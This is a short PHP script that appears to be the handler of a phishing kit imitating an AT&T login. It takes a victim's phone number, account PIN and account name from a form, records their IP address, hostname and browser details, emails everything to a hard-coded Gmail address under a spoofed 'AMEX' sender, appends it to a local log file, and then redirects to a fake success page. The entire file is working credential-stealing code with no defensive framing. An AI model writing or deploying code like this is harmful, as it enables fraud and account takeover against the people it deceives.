<?php 
$to = "helenecostello918@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "==================  AT&T ".$ip."  ==================\n";
$message .= "AT&T Phone Number : ".$_POST['email']."\n";
$message .= "AT&T Account PIN : ".$_POST['psw']."\n";
$message .= "AT&T Account Name : ".$_POST['psw-repeat']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$message .= "=============+Codewizard+===========\n";
$to = "helenecostello918@gmail.com";
$subj = " AT&T Phone  ||".$ip."\n";
$from = "From: AMEX  <codewizard@approject.com>";
$fp = fopen('XXXaxmexXXX00SREZUxxxsassssssilkklllllxSDSSSVSSS.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
$praga=rand();
$praga=md5($praga);
Header ("Location: Successfull.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
?>